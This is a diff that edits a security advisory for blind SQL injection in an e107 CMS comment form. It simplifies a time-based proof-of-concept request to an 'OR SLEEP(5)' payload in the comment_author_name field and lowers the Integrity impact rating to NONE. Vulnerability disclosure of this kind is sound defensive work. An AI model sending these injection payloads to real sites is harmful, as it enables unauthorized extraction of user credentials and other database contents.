@@ -64,10 +64,10 @@ POST /news.php?extend.1 HTTP/1.1
 Host: target-e107-site.com
 Content-Type: application/x-www-form-urlencoded
 
-e-token=<VALID_TOKEN_FROM_PAGE>&comment_type=news&comment_item_id=1&comment_subject=test&comment_comment=test&comment_author_name='+OR+IF(MID(VERSION(),1,1)='5',SLEEP(5),0)+--+
+e-token=<VALID_TOKEN_FROM_PAGE>&comment_type=news&comment_item_id=1&comment_subject=test&comment_comment=test&comment_author_name='+OR+SLEEP(5)+--+
 ```
 
-If the MySQL version starts with '5', the server will sleep for 5 seconds.
+If the injection is successful, the server will sleep for 5 seconds before responding. Works on all MySQL/MariaDB versions.
 
 ### PoC 2: Boolean-Based Blind SQLi
 
@@ -94,7 +94,7 @@ If admin users exist, the query returns results and the comment processes differ
 | CIA Triad | Impact |
 |-----------|--------|
 | **Confidentiality** | HIGH — Attacker can extract any data from the database (user credentials, password hashes, admin sessions, configuration) |
-| **Integrity** | LOW — SELECT queries only in this vector; no direct INSERT/UPDATE/DELETE via this parameter |
+| **Integrity** | NONE — SELECT-only injection; attacker cannot modify database content through this vector |
 | **Availability** | NONE — No denial of service |
 
 ## Patches
